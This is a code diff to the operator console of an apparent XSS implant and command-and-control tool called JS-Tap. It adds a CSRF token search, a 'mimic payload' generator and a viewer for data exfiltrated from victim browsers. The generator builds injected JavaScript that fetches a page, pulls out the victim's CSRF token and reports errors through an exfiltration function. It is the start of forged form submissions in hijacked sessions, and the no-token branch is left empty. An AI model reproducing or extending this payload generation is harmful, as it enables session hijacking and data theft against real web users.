@@ -1,4 +1,6 @@
 let selectedClientId = "";
+let tokenUrl         = "";
+
 
 
 
@@ -114,6 +116,29 @@ function blockClient(imgObject, event, client, nickname)
 }
 
 
+
+function selectAllEvents()
+{
+	var filterModal = document.getElementById('eventFilterModal');
+	var checkboxes  = filterModal.querySelectorAll('input[type="checkbox"]');
+
+	checkboxes.forEach(function(checkbox)
+	{
+		checkbox.checked = true;
+	});
+}
+
+
+function selectNoEvents()
+{
+	var filterModal = document.getElementById('eventFilterModal');
+	var checkboxes  = filterModal.querySelectorAll('input[type="checkbox"]');
+
+	checkboxes.forEach(function(checkbox)
+	{
+		checkbox.checked = false;
+	});
+}
 
 
 function showEventFilterModal()
@@ -1044,6 +1069,37 @@ async function showReqRespViewer(eventKey, type)
 
 
 
+async function searchToken(eventKey, tokenName, tokenValue)
+{
+	var searchDataDiv = document.getElementById('searchDataDiv');
+
+    searchDataDiv.innerHTML = "";
+
+	tokenSearchReq = await fetch('/api/formCsrfTokenSearch/' + eventKey, {
+		method:"POST",
+		body: JSON.stringify({
+			tokenName: tokenName,
+			tokenValue: tokenValue
+		}),
+		headers: {
+			"Content-type": "application/json; charset=UTF-8"
+		}
+	});
+
+	tokenSearchJson = await tokenSearchReq.json();
+
+	var searchData = document.createElement('p');
+
+	searchData.innerHTML  = '<b>CSRF Token URL:</b><br>' + tokenSearchJson.url + '<br><br>';
+	searchData.innerHTML += '<b>CSRF Token file:</b><br>' + tokenSearchJson.fileName + '<br><br>';
+  	searchData.innerHTML += '<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + tokenSearchJson.fileName + `'`+ ')>Download Code</button><br><br>';
+  	searchData.innerHTML += '<b>Click "Next" to build payload</b>';
+  	tokenUrl = tokenSearchJson.url;
+  	searchDataDiv.appendChild(searchData);
+}
+
+
+
 async function showMimicFormModal(eventKey, formDataString)
 {
 
@@ -1051,9 +1107,12 @@ async function showMimicFormModal(eventKey, formDataString)
 	console.log("Showing mimic form modal with key: " + eventKey);
 
 	var searchButton = document.getElementById("mimic-form-search-button");
+	var nextButton   = document.getElementById("mimic-form-next-button");
 	var csrfName     = document.getElementById("csrfNameInput");
 	var csrfValue    = document.getElementById("csrfValueInput");
 
+	csrfName.value  = "";
+	csrfValue.value = "";
 
 	formData = JSON.parse(formDataString);
 
@@ -1069,7 +1128,8 @@ async function showMimicFormModal(eventKey, formDataString)
 	console.log("Content: " + formContent);
 
 
-	var formDataDiv = document.getElementById('formDataDiv')
+	var formDataDiv   = document.getElementById('formDataDiv');
+	var searchDataDiv = document.getElementById('searchDataDiv');
 
 	formDataDiv.innerHTML = "";
 
@@ -1089,11 +1149,10 @@ async function showMimicFormModal(eventKey, formDataString)
     // Append the paragraph to the dynamic div
     formDataDiv.appendChild(data);
 
+    searchDataDiv.innerHTML = "";
+
     searchButton.onclick = function(event) 
     {
-    	console.log("Searching for CSRF tokens!");
-
-
     	var canSearch = true;
 
     	if (csrfName.value.trim() === "")
@@ -1118,19 +1177,54 @@ async function showMimicFormModal(eventKey, formDataString)
 
     	if (canSearch)
     	{
-    		fetch('/api/formCsrfTokenSearch/' + eventKey, {
-    			method:"POST",
-    			body: JSON.stringify({
-        			tokenName: csrfName.value.trim(),
-    				tokenValue: csrfValue.value.trim()
-				
-    			}),
-    			headers: {
-					"Content-type": "application/json; charset=UTF-8"
-				}
-    		});
+    		searchToken(eventKey, csrfName.value.trim(), csrfValue.value.trim())
     	}
+
+    	searchButton.blur();
     }
+
+
+    // Generate a mimic payload
+    nextButton.onclick = function(event)
+    {
+    	// Let's generate that payload
+    	var payload = "";
+
+    	payload += "// JS-Tap mimic generated payload\n";
+
+    	// Check if we have a CSRF token to deal with
+    	if (searchDataDiv.innerHTML != "")
+    	{
+    		// There is a CSRF token to contend with
+    		console.log("** Generating payload with a CSRF token...");
+    		payload += "// Get the CSRF token first\n";
+    		payload += "fetch('" + tokenUrl + "')\n";
+    		payload += "	.then(response =>{\n";
+    		payload += "		if(!response.ok){\n";
+    		payload += "			customExfil('Error', 'Error fetching CSRF Token with Mimic payload');\n";
+    		payload += "		}\n";
+    		payload += "		return response.text();\n";
+    		payload += "	})\n";
+    		payload += "	.then(text => {\n";
+    		payload += "		fetchedContent = text;\n";
+    		payload += "		var parser     = new DOMParser();\n";
+    		payload += "		var parsedDoc  = parser.parseFromString(fetchedContent, 'text/html');\n";
+    		payload += `		var tokenInput = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
+    		payload += "		var csrfToken  = tokenInput.value;\n";
+    		payload += "	})\n";
+
+    		console.log("Generated payload:");
+    		console.log(payload);
+    	} 	
+    	else
+    	{
+    		// There is no CSRF token to contend with
+    		console.log("-- Generating payload withough a CSRF token...");
+    	}
+
+    }
+
+
 
 
 	var modal = new bootstrap.Modal(document.getElementById('createFormMimicModal'));
@@ -1409,6 +1503,27 @@ async function getClientDetails(id)
    	  	jsonDataString = JSON.stringify(formPostJson).replace(/"/g, '&quot;');
 		cardText.innerHTML += `<button type="button" class="btn btn-primary" onclick="showMimicFormModal('${eventKey}', '${jsonDataString}')">Create Mimic Payload</button>`;
 	}
+  	break;
+
+
+  case 'CUSTOMEXFIL':
+  	if (document.getElementById('customExfilEvents').checked == true)
+  	{
+  		activeEvent = true;
+
+  		// fetch the data from the api
+  		customExfilReq  = await fetch('/api/clientCustomExfil/' + eventKey);
+  		customExfilJson = await customExfilReq.json();
+
+  		note = escapeHTML(atob(customExfilJson.note));
+  		data = escapeHTML(atob(customExfilJson.data));
+
+  		cardTitle.innerHTML = "Custom Payload Exfiltrated Data";
+  		cardText.innerHTML += "Note: <br>";
+  		cardText.innerHTML += "<b>" + note + "</b><br><br>";
+  		cardText.innerHTML += "Data: <br>";
+  		cardText.innerHTML += "<b>" + data + "</b>";
+  	}
   	break;
 
 
